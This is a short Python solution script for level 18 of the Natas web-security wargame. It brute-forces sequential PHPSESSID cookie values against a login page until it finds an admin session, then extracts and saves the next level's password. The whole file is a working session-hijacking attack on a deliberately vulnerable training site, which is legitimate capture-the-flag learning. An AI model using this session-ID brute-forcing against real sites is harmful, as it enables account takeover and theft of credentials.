"""
Find the right session without un-setting admin!
"""

from bs4 import BeautifulSoup
import requests
from typing import Optional

from natas_utils import *

LEVEL = 18

def solve(url: str, login: LevelLogin) -> Optional[str]:
    for i in range(1, 641):
        with requests.session() as session:
            session.auth = login
            session.cookies.set("PHPSESSID", str(i))
            response = session.post(f"{url}/index.php?debug=1", data={"username": "admin", "password": "admin"})
            response.raise_for_status()

            if "You are an admin" in response.text:
                candidates = extract_candidate_passwords(response.text)
                if len(candidates) == 1:
                    return candidates[0]
    return None

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    flag = solve(url, login)

    if flag:
        print("natas{:02}:".format(LEVEL + 1), flag)
        store_level_password(LEVEL + 1, flag)
    else:
        exit("Failed to get password for natas{:02}.".format(LEVEL + 1))